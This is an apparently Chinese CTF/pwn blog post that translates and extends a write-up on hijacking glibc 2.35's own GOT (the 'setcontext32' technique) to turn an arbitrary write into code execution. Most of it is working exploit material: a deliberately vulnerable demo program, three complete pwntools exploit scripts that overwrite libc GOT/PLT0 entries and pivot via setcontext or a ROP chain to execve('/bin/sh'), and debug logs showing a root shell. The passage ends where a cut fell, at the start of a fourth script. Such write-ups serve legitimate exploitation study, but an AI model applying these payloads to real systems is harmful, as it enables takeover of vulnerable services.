---
title: glibc GOT hijack 分析
id: 9e7d865e-2582-491f-b20c-5e6a96a28f62
date: 2024-01-10 16:51:53
auther: yrl
cover: 
excerpt: glibc GOT hijack 原文翻译 modern arb write -> rce is hard 提出该方法的大佬是这么说的，我仅翻译，后面会拓展： 目前，将任意写入原语转换为rce是一个难以处理的过程，利用__free_hook的实现rce的好时代过去了，现在我们大概还有如下几个方法来实
permalink: /archives/glibc%20GOT%20hijack
categories:
 - pwn知识点
tags: 
 - rop
 - glibc_got_hijack
---

# glibc GOT hijack

## 原文翻译

### modern arb write -> rce is hard

提出该方法的大佬是[这么说的](https://hackmd.io/@pepsipu/SyqPbk94a)，我仅翻译，后面会拓展：

目前，将任意写入原语转换为rce是一个难以处理的过程，利用`__free_hook`的实现rce的好时代过去了，现在我们大概还有如下几个方法来实现rce：

1. 泄露`mangling cookie`来修改现有的`__exit_funcs`条目
2. 计算ld.so的偏移去覆写`l_addr`并创建一个fake `DT_FINI`条目
3. 在被劫持的IO对象上设置特殊的`_codecvt`和`_wide_data`结构

我只想指定我要调用的函数及其参数！

我想要一个灵活的RCE原语。我不想依赖`_IO_cleanup`、`_dl_fini`或`malloc`来调用我注入的代码，我想要一个天生通用的gadget，一个我可以用最简洁的heap bins和被伪造破坏的IO对象来调用的gadget。

我希望能够用任何一组参数调用任何函数，而不需要栈迁移或希望系统是堆栈对齐的。我想避免这几个约束，所以one_gadget就可以实现！

### setcontext32

setcontext32是一种将任意写入转换为灵活的任意代码执行的巧妙方法。粗略地说，它看起来像:

```python
write(libc_write_address, flat(
    p64(0),
    p64(libc_write_address + 0x218)
    p64(setcontext+32),
    p64(libc_exe_address) * 0x40,
    cpu_state_information,
))
```

其中，`libc_write_address`是libc中可写页的开始(GOT[0])，`libc_exe_address`是libc的可执行页的开始(PLT[0])；`cpu_state_information`是一个的结构，包含所有当前寄存器状态，包括rsp和rip。

### high level overview

libc中的每个GOT条目，如memset、memcpy、strcpy和strlen，都被PLT[0]覆盖，后者从可执行页面的开头(PLT[0])开始。PLT[0]推送一个伪造的linkmap指向`libc_write_address+0x218`，并调用一个伪造的运行时解析器`setcontext+32`，所有这些都从可写页面的开头(libc_write_address)开始。

调用大多数libc函数将触发setcontext32，包括malloc、exit和（几乎？）每个IO操作。

### why

libc的GOT是可写的，因此您可以使用特定于体系结构的函数，例如为SSE或AVX512优化的memcpy。一位朋友也猜测这可能是为了ltrace。我从pwndbg创建者[disconnect3d](https://twitter.com/disconnect3d_pl)那里了解到libcGOT是可写的。

### code

以下是您可以轻松导入以生成setcontext32有效负载（或集成到您的pwn库中）的代码。下面是一个例子：

```python
from pwn import *


def create_ucontext(
    src: int,
    rsp=0,
    rbx=0,
    rbp=0,
    r12=0,
    r13=0,
    r14=0,
    r15=0,
    rsi=0,
    rdi=0,
    rcx=0,
    r8=0,
    r9=0,
    rdx=0,
    rip=0xDEADBEEF,
) -> bytearray:
    b = bytearray(0x200)
    b[0xE0:0xE8] = p64(src)  # fldenv ptr
    b[0x1C0:0x1C8] = p64(0x1F80)  # ldmxcsr

    b[0xA0:0xA8] = p64(rsp)
    b[0x80:0x88] = p64(rbx)
    b[0x78:0x80] = p64(rbp)
    b[0x48:0x50] = p64(r12)
    b[0x50:0x58] = p64(r13)
    b[0x58:0x60] = p64(r14)
    b[0x60:0x68] = p64(r15)

    b[0xA8:0xB0] = p64(rip)  # ret ptr
    b[0x70:0x78] = p64(rsi)
    b[0x68:0x70] = p64(rdi)
    b[0x98:0xA0] = p64(rcx)
    b[0x28:0x30] = p64(r8)
    b[0x30:0x38] = p64(r9)
    b[0x88:0x90] = p64(rdx)

    return b


def setcontext32(libc: ELF, **kwargs) -> (int, bytes):
    got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    plt_trampoline = libc.address + libc.get_section_by_name(".plt").header.sh_addr
    return got, flat(
        p64(0),
        p64(got + 0x218),
        p64(libc.symbols["setcontext"] + 32),
        p64(plt_trampoline) * 0x40,
        create_ucontext(got + 0x218, rsp=libc.symbols["environ"] + 8, **kwargs),
    )


if __name__ == "__main__":
    libc = ELF("./libc.so.6")
    dest, payload = setcontext32.setcontext32(
        libc, rip=libc.sym["system"], rdi=libc.search(b"/bin/sh").__next__()
    )
    print(hex(dest), payload.hex())
```

至此翻译结束。

## 分析

现提供demo代码如下：

```c
#include <stdio.h>
#include <unistd.h>

int main() {
    char *addr = 0;
    size_t len = 0;
    printf("%p\n", printf);
    read(0, &addr, 8);
    read(0, &len, 8);
    read(0, addr, len);
    printf("glibc got hijack");
}

```

代码模拟了当我们泄露libc后，有一个任意地址写，如何能将任意地址写转换成RCE，获得一个shell呢？

## 0x00 origin-0x388

如上文翻译中大佬说的，在高版本的glibc环境里，自从取消了freehook后，我们少了一种方便好用的rce方式，要做任意地址写到rce变得困难，大概率的可能方式是通过IOFILE等方式来进行RCE，[大佬](https://hackmd.io/@pepsipu/SyqPbk94a)提供了另一种方式可以转化任意地址写到RCE，打glibc的got表，本人觉得比IOFILE要好用，毕竟ROP大法好嘛

确认实验环境的glibc版本：

```bash
➜  d1ag0n ✗ /root/glibc-all-in-one/libs/2.35-0ubuntu3.5_amd64/libc.so.6
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.5) stable release version 2.35.
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 11.4.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
➜  d1ag0n ✗ md5sum /root/glibc-all-in-one/libs/2.35-0ubuntu3.5_amd64/libc.so.6
f1d497618445f1a0d122a2900b2a5b87  /root/glibc-all-in-one/libs/2.35-0ubuntu3.5_amd64/libc.so.6
```

glibc存在的一个非常好用的gadget叫setcontext：

```bash
│   0x00007fc4595b0a00 <+32>:    pop    rdx    
│=> 0x00007fc4595b0a01 <+33>:    cmp    rax,0xfffffffffffff001                                                                        
│   0x00007fc4595b0a07 <+39>:    jae    0x7fc4595b0b2f <setcontext+335>
│   0x00007fc4595b0a0d <+45>:    mov    rcx,QWORD PTR [rdx+0xe0]
│   0x00007fc4595b0a14 <+52>:    fldenv [rcx]
│   0x00007fc4595b0a16 <+54>:    ldmxcsr DWORD PTR [rdx+0x1c0]  
│   0x00007fc4595b0a1d <+61>:    mov    rsp,QWORD PTR [rdx+0xa0]
│   0x00007fc4595b0a24 <+68>:    mov    rbx,QWORD PTR [rdx+0x80]
│   0x00007fc4595b0a2b <+75>:    mov    rbp,QWORD PTR [rdx+0x78]
│   0x00007fc4595b0a2f <+79>:    mov    r12,QWORD PTR [rdx+0x48]
│   0x00007fc4595b0a33 <+83>:    mov    r13,QWORD PTR [rdx+0x50]
│   0x00007fc4595b0a37 <+87>:    mov    r14,QWORD PTR [rdx+0x58]
│   0x00007fc4595b0a3b <+91>:    mov    r15,QWORD PTR [rdx+0x60]
│   0x00007fc4595b0a3f <+95>:    test   DWORD PTR fs:0x48,0x2
│   0x00007fc4595b0a4b <+107>:   je     0x7fc4595b0b06 <setcontext+294>

│   0x00007fc4595b0b06 <+294>:   mov    rcx,QWORD PTR [rdx+0xa8]
│   0x00007fc4595b0b0d <+301>:   push   rcx
│   0x00007fc4595b0b0e <+302>:   mov    rsi,QWORD PTR [rdx+0x70]
│   0x00007fc4595b0b12 <+306>:   mov    rdi,QWORD PTR [rdx+0x68]
│   0x00007fc4595b0b16 <+310>:   mov    rcx,QWORD PTR [rdx+0x98]
│   0x00007fc4595b0b1d <+317>:   mov    r8,QWORD PTR [rdx+0x28]
│   0x00007fc4595b0b21 <+321>:   mov    r9,QWORD PTR [rdx+0x30]
│   0x00007fc4595b0b25 <+325>:   mov    rdx,QWORD PTR [rdx+0x88]
│   0x00007fc4595b0b2c <+332>:   xor    eax,eax
│   0x00007fc4595b0b2e <+334>:   ret    
```

我们通常会提前控制rdx的值，从setcontext+61处的`mov    rsp,QWORD PTR [rdx+0xa0]`来调用，刷新所有寄存器，然后调用目标函数；但这次我们可以从setcontext+32处的`pop    rdx`开始调用，利用pop来控制rdx，为什么从这里开始可以控制rdx，这个后面会说到。

和普通的动态链接的程序一样，glibc也是有`.got.plt`表的，在执行的时候也会去调用plt，进而跳转到got表，例如glibc内部执行printf函数时，会调用`strchrnul.plt`，进而调用`strchrnul.got`取出strchrnul真实地址并执行

```bash
─────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────
 ► 0x7ffff7dbb4d0 <*ABS*+0xab010@plt>       endbr64 
   0x7ffff7dbb4d4 <*ABS*+0xab010@plt+4>     bnd jmp qword ptr [rip + 0x1f0bdd]   <__strchrnul_avx2>
    ↓
   0x7ffff7f30200 <__strchrnul_avx2>        endbr64 
   0x7ffff7f30204 <__strchrnul_avx2+4>      vmovd  xmm0, esi
   0x7ffff7f30208 <__strchrnul_avx2+8>      mov    eax, edi
   0x7ffff7f3020a <__strchrnul_avx2+10>     and    eax, 0xfff
   0x7ffff7f3020f <__strchrnul_avx2+15>     vpbroadcastb ymm0, xmm0
   0x7ffff7f30214 <__strchrnul_avx2+20>     vpxor  xmm9, xmm9, xmm9
   0x7ffff7f30219 <__strchrnul_avx2+25>     cmp    eax, 0xfe0
   0x7ffff7f3021e <__strchrnul_avx2+30>     ja     __strchrnul_avx2+464                <__strchrnul_avx2+464>
    ↓
   0x7ffff7f303d0 <__strchrnul_avx2+464>    mov    rdx, rdi
───────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffd7b8 —▸ 0x7ffff7e080e2 (__vfprintf_internal+178) ◂— mov qword ptr [rsp + 0xf8], rbp
01:0008│     0x7fffffffd7c0 —▸ 0x7ffff7fbb320 —▸ 0x7ffff7d93000 ◂— 0x3010102464c457f
02:0010│     0x7fffffffd7c8 —▸ 0x555555556008 ◂— 0x3233316e /* 'n132' */
03:0018│     0x7fffffffd7d0 ◂— 0x3000000008
04:0020│     0x7fffffffd7d8 —▸ 0x7fffffffde10 —▸ 0x7fffffffe229 ◂— 0x34365f363878 /* 'x86_64' */
05:0028│     0x7fffffffd7e0 —▸ 0x7fffffffdd30 ◂— 0x3000000008
06:0030│     0x7fffffffd7e8 ◂— 0xffffff0000000000
07:0038│     0x7fffffffd7f0 ◂— 0xd68 /* 'h\r' */
```

在glibc2.35中，`.got.plt`在执行时一直是`rw-`权限的，包括最前面的GOT0项（因为从2.36开始GOT0就不可写了，需要用到新的方法）：

```bash
pwndbg> tel 0x7ffff7d93000+0x219000
00:0000│  0x7ffff7fac000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x218bc0
01:0008│  0x7ffff7fac008 (_GLOBAL_OFFSET_TABLE_+8) —▸ 0x7ffff7fbb320 —▸ 0x7ffff7d93000 ◂— 0x3010102464c457f
02:0010│  0x7ffff7fac010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0x7ffff7fd8d30 (_dl_runtime_resolve_xsavec) ◂— endbr64 
03:0018│  0x7ffff7fac018 (*ABS*@got.plt) —▸ 0x7ffff7f30760 (__strnlen_avx2) ◂— endbr64 
04:0020│  0x7ffff7fac020 (*ABS*@got.plt) —▸ 0x7ffff7f2c390 (__rawmemchr_avx2) ◂— endbr64 
05:0028│  0x7ffff7fac028 (realloc@got[plt]) —▸ 0x7ffff7dbb030 ◂— endbr64 
06:0030│  0x7ffff7fac030 (*ABS*@got.plt) —▸ 0x7ffff7f2e5b0 (__strncasecmp_avx) ◂— endbr64 
07:0038│  0x7ffff7fac038 (_dl_exception_create@got.plt) —▸ 0x7ffff7dbb050 ◂— endbr64 
pwndbg> vmmap 0x7ffff7fac000
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
    0x7ffff7fa8000     0x7ffff7fac000 r--p     4000 214000 /root/glibc-all-in-one/libs/2.35-0ubuntu3.5_amd64/libc.so.6
►   0x7ffff7fac000     0x7ffff7fae000 rw-p     2000 218000 /root/glibc-all-in-one/libs/2.35-0ubuntu3.5_amd64/libc.so.6 +0x0
    0x7ffff7fae000     0x7ffff7fbd000 rw-p     f000      0 [anon_7ffff7fae]
```

我们可以注意到plt[0]的代码如下：

```bash
.plt:0000000000028000 ; __unwind {
.plt:0000000000028000                 push    cs:qword_219008
.plt:0000000000028006                 bnd jmp cs:qword_219010
.plt:0000000000028006 sub_28000       endp
```

qword_219008、qword_2190010都是从GOT[0]取出来的，在任意地址写的情况下我们可以控制qword_219008的内容，可以通过PLT[0]的`push    cs:qword_219008`和setcontext+32的`pop rdx`，成功控制rdx。

因此这一套利用思路就是：

1. 修改`strchrnul.got`到`plt0`(0x28000)
2. 修改`GOT0`(0x219008)为GOT表下面(GOT[0]+0x1c0后)的内存空间(可视情况而定)
3. 修改`GOT0`(0x219010)为`setcontext`的gadget(0x53A00)
4. 在GOT表下面(GOT[0]+0x1c0后)的内存空间中布置setcontext需要用到的context buffer
5. 调用printf函数触发strchrnul.plt劫持程序流，完成利用

如下是关于demo的完整exp：

```python
#!/usr/bin/env python3
# coding=utf8
import inspect
from pwn import *

context.log_level = 'debug'

elf = ELF('./main')
libc = elf.libc
cn = process('./main')

def tobytes(x): return x.encode('latin1') if isinstance(x, str) else x
def sd(x): return cn.send(tobytes(x))
def sl(x): return cn.sendline(tobytes(x))
def sa(a, b): return cn.sendafter(tobytes(a), tobytes(b))
def sla(a, b): return cn.sendlineafter(tobytes(a), tobytes(b))
def rv(x=0x1000): return cn.recv(x)
def rl(): return cn.recvline()
def ru(x): return cn.recvuntil(tobytes(x))
def raddr(): return u64(cn.recvuntil(b'\n')[:-1].ljust(8, b'\x00'))
def raddrn(x): return u64(rv(x).ljust(8, b'\x00'))
def interact(): return cn.interactive()
def ss(s): return success(s)


def logsym(val):
    for line in inspect.getframeinfo(inspect.currentframe().f_back)[3]:
        m = re.search(r'\blogsym\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)', line)
    if m:
        varname = m.group(1)
        ss(f"{varname} => {hex(val)}")
    else:
        ss(hex(val))

############################################
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

def create_ucontext(src: int, rsp=0, rbx=0, rbp=0, r12=0, r13=0, r14=0, r15=0,
                    rsi=0, rdi=0, rcx=0, r8=0, r9=0, rdx=0, rip=0) -> bytearray:
    b = flat({
        0x28: r8,
        0x30: r9,
        0x48: r12,
        0x50: r13,
        0x58: r14,
        0x60: r15,
        0x68: rdi,
        0x70: rsi,
        0x78: rbp,
        0x80: rbx,
        0x88: rdx,
        0x98: rcx,
        0xA0: rsp,
        0xA8: rip,  # ret ptr
        0xE0: src,  # fldenv ptr
        0x1C0: 0x1F80,  # ldmxcsr
    }, filler=b'\x00', word_size=64)
    return b


def setcontext32(libc: ELF, **kwargs) -> (int, bytes):
    got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    plt0 = libc.address + libc.get_section_by_name(
        ".plt").header.sh_addr
    write_dest = got + 8
    got_count = 0x15  # hardcoded point overwrite strchrnul to plt[0]
    context_dest = write_dest + 0x10 + got_count * 8
    write_data = flat(
        context_dest,
        libc.symbols["setcontext"] + 32,
        [plt0] * got_count,
        create_ucontext(context_dest, rsp=libc.symbols["environ"] + 8,
                        **kwargs),
    )
    return write_dest, write_data


leak = int(rl(), 16)
logsym(leak)
lbase = leak - libc.sym['printf']
logsym(lbase)
libc.address = lbase

dest, payload = setcontext32(
    libc,
    rip=libc.sym["execve"],
    rdi=libc.search(b"/bin/sh").__next__(),
    rsi=0,
    rdx=0,
)
ss("write payload to {}, length {}".format(hex(dest), hex(len(payload))))
# attach(cn)
sd(p64(dest))
sd(p64(len(payload)))
sd(payload)

interact()
```

```bash
[+] Starting local process './main' argv=[b'./main'] : pid 22997
[DEBUG] Received 0xf bytes:
    b'0x7f330c0a56f0\n'
[+] leak => 0x7f330c0a56f0
[+] lbase => 0x7f330c045000
[+] write payload to 0x7f330c25e008, length 0x388
[DEBUG] Sent 0x8 bytes:
    00000000  08 e0 25 0c  33 7f 00 00                            │··%·│3···│
    00000008
[DEBUG] Sent 0x8 bytes:
    00000000  88 03 00 00  00 00 00 00                            │····│····│
    00000008
[DEBUG] Sent 0x388 bytes:
    00000000  c8 e1 25 0c  33 7f 00 00  00 8a 09 0c  33 7f 00 00  │··%·│3···│····│3···│
    00000010  00 d0 06 0c  33 7f 00 00  00 d0 06 0c  33 7f 00 00  │····│3···│····│3···│
    *
    000001c0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000220  00 00 00 00  00 00 00 00  78 d6 21 0c  33 7f 00 00  │····│····│x·!·│3···│
    00000230  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000260  08 62 26 0c  33 7f 00 00  80 00 13 0c  33 7f 00 00  │·b&·│3···│····│3···│
    00000270  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    000002a0  c8 e1 25 0c  33 7f 00 00  00 00 00 00  00 00 00 00  │··%·│3···│····│····│
    000002b0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000380  80 1f 00 00  00 00 00 00                            │····│····│
    00000388
[*] Switching to interactive mode
$ id
[DEBUG] Sent 0x3 bytes:
    b'id\n'
[DEBUG] Received 0x27 bytes:
    b'uid=0(root) gid=0(root) groups=0(root)\n'
uid=0(root) gid=0(root) groups=0(root)
$  
```

payload长度为0x388 Bytes，优化方法请看下文。

## 0x01 fix0-0x1a0

在origin方案中，设置的context是完整的：

```python
def create_ucontext(src: int, rsp=0, rbx=0, rbp=0, r12=0, r13=0, r14=0, r15=0,
                    rsi=0, rdi=0, rcx=0, r8=0, r9=0, rdx=0, rip=0) -> bytearray:
    b = flat({
        0x28: r8,
        0x30: r9,
        0x48: r12,
        0x50: r13,
        0x58: r14,
        0x60: r15,
        0x68: rdi,
        0x70: rsi,
        0x78: rbp,
        0x80: rbx,
        0x88: rdx,
        0x98: rcx,
        0xA0: rsp,
        0xA8: rip,  # ret ptr
        0xE0: src,  # fldenv ptr
        0x1C0: 0x1F80,  # ldmxcsr
    }, filler=b'\x00', word_size=64)
    return b
```

而其实rdi前的那些寄存器就算不设置也不影响RCE。因此我们可以让`context buffer`和前面的内容做适当的overlap，只控制rdi后的内容就好了，这样就能省去不少空间。

```python

def lite_context(src: int, rsp=0, rbx=0, rbp=0, rsi=0, rdi=0, rcx=0, rdx=0,
                 rip=0xDEADBEEF) -> bytearray:
    b = flat({
        0x68: rdi,
        0x70: rsi,
        0x78: rbp,
        0x80: rbx,
        0x88: rdx,
        0x98: rcx,
        0xA0: rsp,
        0xA8: rip,  # ret ptr
        0xE0: src,  # fldenv ptr
        # 0x1C0: 0x1F80,  # assume ldmxcsr == 0
    }, filler=b'\x00', word_size=64)[0x68:]
    return b

```

注意到我们去掉了对offset 0x1C0值的设置，只要里面的值似乎是个偏移，只要可写不超出可写的寻址范围，应该就没事。我们可以通过提前分析glibc来规避。
        
    fldenv和ldmxcsr是FPU浮点计数器的汇编指令,含义是加载数据到FPU寄存器中。

例如在我们实验环境中的glibc中，如果不做偏移，offset 0x1C0刚好是0，没问题，将其设置成0xffffffffffffff或0x11001都core了，改成0x1001等是正常的。

还有一个优化点就是，根据程序的不同，got表项不需要全部写成plt[0]，只需要将目标函数触发的那个got表项覆盖为plt[0]即可，在实验中可以将got_count改成0x15，刚好将strchrnul.got覆盖为plt[0]

修改优化后代码如下：

```python
#!/usr/bin/env python3
# coding=utf8
import inspect
from pwn import *

context.log_level = 'debug'

elf = ELF('./main')
libc = elf.libc
cn = process('./main')

def tobytes(x): return x.encode('latin1') if isinstance(x, str) else x
def sd(x): return cn.send(tobytes(x))
def sl(x): return cn.sendline(tobytes(x))
def sa(a, b): return cn.sendafter(tobytes(a), tobytes(b))
def sla(a, b): return cn.sendlineafter(tobytes(a), tobytes(b))
def rv(x=0x1000): return cn.recv(x)
def rl(): return cn.recvline()
def ru(x): return cn.recvuntil(tobytes(x))
def raddr(): return u64(cn.recvuntil(b'\n')[:-1].ljust(8, b'\x00'))
def raddrn(x): return u64(rv(x).ljust(8, b'\x00'))
def interact(): return cn.interactive()
def ss(s): return success(s)


def logsym(val):
    for line in inspect.getframeinfo(inspect.currentframe().f_back)[3]:
        m = re.search(r'\blogsym\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)', line)
    if m:
        varname = m.group(1)
        ss(f"{varname} => {hex(val)}")
    else:
        ss(hex(val))

############################################
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

def fix0_create_ucontext(src: int, rsp=0, rbx=0, rbp=0, r12=0, r13=0, r14=0, r15=0,
                    rsi=0, rdi=0, rcx=0, r8=0, r9=0, rdx=0, rip=0) -> bytearray:
    b = flat({
        0x68: rdi,
        0x70: rsi,
        0x78: rbp,
        0x80: rbx,
        0x88: rdx,
        0x98: rcx,
        0xA0: rsp,
        0xA8: rip,  # ret ptr
        0xE0: src,  # fldenv ptr
        # 0x1C0: 0x1F80,  # ldmxcsr
    }, filler=b'\x00', word_size=64)
    return b


def setcontext32(libc: ELF, **kwargs) -> (int, bytes):
    got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    plt0 = libc.address + libc.get_section_by_name(
        ".plt").header.sh_addr
    write_dest = got + 8
    got_count = 0x15  # hardcoded point overwrite strchrnul to plt[0]
    context_dest = write_dest + 0x10 + got_count * 8
    write_data = flat(
        context_dest,
        libc.symbols["setcontext"] + 32,
        [plt0] * got_count,
        fix0_create_ucontext(context_dest, rsp=libc.symbols["environ"] + 8,
                        **kwargs),
    )
    return write_dest, write_data


leak = int(rl(), 16)
logsym(leak)
lbase = leak - libc.sym['printf']
logsym(lbase)
libc.address = lbase

dest, payload = setcontext32(
    libc,
    rip=libc.sym["execve"],
    rdi=libc.search(b"/bin/sh").__next__(),
    rsi=0,
    rdx=0,
)
ss("write payload to {}, length {}".format(hex(dest), hex(len(payload))))
# attach(cn)
sd(p64(dest))
sd(p64(len(payload)))
sd(payload)

interact()
```

```bash
[+] leak => 0x7f6c45ea16f0
[+] lbase => 0x7f6c45e41000
[+] write payload to 0x7f6c4605a008, length 0x1a0
[DEBUG] Sent 0x8 bytes:
    00000000  08 a0 05 46  6c 7f 00 00                            │···F│l···│
    00000008
[DEBUG] Sent 0x8 bytes:
    00000000  a0 01 00 00  00 00 00 00                            │····│····│
    00000008
[DEBUG] Sent 0x1a0 bytes:
    00000000  c0 a0 05 46  6c 7f 00 00  00 4a e9 45  6c 7f 00 00  │···F│l···│·J·E│l···│
    00000010  00 90 e6 45  6c 7f 00 00  00 90 e6 45  6c 7f 00 00  │···E│l···│···E│l···│
    *
    000000b0  00 90 e6 45  6c 7f 00 00  00 00 00 00  00 00 00 00  │···E│l···│····│····│
    000000c0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000120  78 96 01 46  6c 7f 00 00  00 00 00 00  00 00 00 00  │x··F│l···│····│····│
    00000130  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000150  00 00 00 00  00 00 00 00  08 22 06 46  6c 7f 00 00  │····│····│·"·F│l···│
    00000160  80 c0 f2 45  6c 7f 00 00  00 00 00 00  00 00 00 00  │···E│l···│····│····│
    00000170  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000190  00 00 00 00  00 00 00 00  c0 a0 05 46  6c 7f 00 00  │····│····│···F│l···│
    000001a0
[*] Switching to interactive mode
$ id
[DEBUG] Sent 0x3 bytes:
    b'id\n'
[DEBUG] Received 0x27 bytes:
    b'uid=0(root) gid=0(root) groups=0(root)\n'
uid=0(root) gid=0(root) groups=0(root)
$  
```

现在payload为0x1a0 Bytes，还能减少payload字节嘛？请看下文。

## 0x02 fix1-0xf8

上文我们是使用setcontext gadget来设置寄存器，这样的代价就是context buffer非常大。其实我们也完全可以通过ROP来做到这点。

将GOT1设置为gadget `pop rsp; ret`，然后将GOT0设置为GOT下面一点的位置(GOT[0]+0x1c0)（视情况而定），实则是将栈迁移到GOT表内存中，然后再里面布置好ROP chain即可。

同样的，我们可以减少got_count，来减少payload长度，只要保证plt[0]覆盖到目标got表项即可，

完整exp代码如下：

```python
#!/usr/bin/env python3
# coding=utf8
import inspect
from pwn import *

context.log_level = 'debug'

elf = ELF('./main')
libc = elf.libc
cn = process('./main')

def tobytes(x): return x.encode('latin1') if isinstance(x, str) else x
def sd(x): return cn.send(tobytes(x))
def sl(x): return cn.sendline(tobytes(x))
def sa(a, b): return cn.sendafter(tobytes(a), tobytes(b))
def sla(a, b): return cn.sendlineafter(tobytes(a), tobytes(b))
def rv(x=0x1000): return cn.recv(x)
def rl(): return cn.recvline()
def ru(x): return cn.recvuntil(tobytes(x))
def raddr(): return u64(cn.recvuntil(b'\n')[:-1].ljust(8, b'\x00'))
def raddrn(x): return u64(rv(x).ljust(8, b'\x00'))
def interact(): return cn.interactive()
def ss(s): return success(s)


def logsym(val):
    for line in inspect.getframeinfo(inspect.currentframe().f_back)[3]:
        m = re.search(r'\blogsym\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)', line)
    if m:
        varname = m.group(1)
        ss(f"{varname} => {hex(val)}")
    else:
        ss(hex(val))


############################################

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


class ROPgadget:
    def __init__(self, libc: ELF, base=0):
        if Path("./gadgets").exists():
            print(
                "[!] Using gadgets, make sure that's corresponding to the libc!")
        else:
            fp = open("./gadgets", 'wb')
            subprocess.run(f"ROPgadget --binary {libc.path}".split(" "),
                           stdout=fp)
            fp.close()
        fp = open("./gadgets", 'rb')
        data = fp.readlines()[2:-2]
        data = [x.strip().split(b" : ") for x in data]
        data = [[int(x[0], 16), x[1].decode()] for x in data]
        fp.close()
        self.gadgets = data
        self.base = base

    def search(self, s):
        for addr, ctx in self.gadgets:
            if ctx == s:
                return addr + self.base
        return None


def fix1_create(libc: ELF, rop_chain):
    got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    plt0 = libc.address + libc.get_section_by_name(".plt").header.sh_addr
    pivot = rop.find_gadget(["pop rsp", 'ret'])[0]
    write_dest = got + 8
    got_count = 0x15  # hardcoded
    rop_dest = write_dest + 0x10 + got_count * 8
    write_data = flat(
        rop_dest,
        pivot,
        [plt0] * got_count,
        rop_chain
    )
    return write_dest, write_data


leak = int(rl(), 16)
logsym(leak)
lbase = leak - libc.sym['printf']
logsym(lbase)
libc.address = lbase

rop = ROP(libc)
rdi = rop.find_gadget(["pop rdi", 'ret'])[0]
rsi = rop.find_gadget(["pop rsi", 'ret'])[0]
rdx = rop.find_gadget(["pop rdx", "pop r12", 'ret'])[0]
rop_chain = flat(
    rdi, libc.search(b"/bin/sh").__next__(),
    rsi, 0,
    rdx, 0, 0,
    libc.sym['execve']
)
dest, payload = fix1_create(libc, rop_chain=rop_chain)

ss("write payload to {}, length {}".format(hex(dest), hex(len(payload))))
# attach(cn)
sd(p64(dest))
sd(p64(len(payload)))
sd(payload)

interact()
```

```bash
[+] leak => 0x7fc9fa0ac6f0
[+] lbase => 0x7fc9fa04c000
[*] Loaded 220 cached gadgets for '/root/glibc-all-in-one/libs/2.35-0ubuntu3.5_amd64/libc.so.6'
[+] write payload to 0x7fc9fa265008, length 0xf8
[DEBUG] Sent 0x8 bytes:
    00000000  08 50 26 fa  c9 7f 00 00                            │·P&·│····│
    00000008
[DEBUG] Sent 0x8 bytes:
    00000000  f8 00 00 00  00 00 00 00                            │····│····│
    00000008
[DEBUG] Sent 0xf8 bytes:
    00000000  c0 50 26 fa  c9 7f 00 00  32 17 08 fa  c9 7f 00 00  │·P&·│····│2···│····│
    00000010  00 40 07 fa  c9 7f 00 00  00 40 07 fa  c9 7f 00 00  │·@··│····│·@··│····│
    *
    000000b0  00 40 07 fa  c9 7f 00 00  e5 63 07 fa  c9 7f 00 00  │·@··│····│·c··│····│
    000000c0  78 46 22 fa  c9 7f 00 00  51 7e 07 fa  c9 7f 00 00  │xF"·│····│Q~··│····│
    000000d0  00 00 00 00  00 00 00 00  f7 b0 16 fa  c9 7f 00 00  │····│····│····│····│
    000000e0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    000000f0  80 70 13 fa  c9 7f 00 00                            │·p··│····│
    000000f8
[*] Switching to interactive mode
$ id
[DEBUG] Sent 0x3 bytes:
    b'id\n'
[DEBUG] Received 0x27 bytes:
    b'uid=0(root) gid=0(root) groups=0(root)\n'
uid=0(root) gid=0(root) groups=0(root)
$  
```

现在payload长度为0xf8 Bytes，还可以减少payload长度嘛？请看下文。

## 0x02 fix2-0xe8

上面这样ROP有个问题，为了让payload尽可能短，我们放ROP的位置其实离GOT0很近，而GOT0的低地址处就是`ro page`和`rw page`的交界处。而stack是向低地址生长的，因此我们调用system这样的函数，rsp很容易一不小心就到`ro page`上从而崩溃。

为了调用system从而缩短payload，我们可以做两次栈迁移。大致思路如下：

1. 调用`pop rsp; ret`将栈迁移到GOT中的ROP gadget处
2. 调用`pop rdi; ret`设置rdi到”/bin/sh”
3. 调用`pop rax; ret`设置rax到system
4. 调用gadget `pop rsp; jmp rax`完成二次栈迁移且跳转到system完成利用

同样减少got_count，来减少payload长度

```python
#!/usr/bin/env python3
# coding=utf8
import inspect
from pwn import *

context.log_level = 'debug'

elf = ELF('./main')
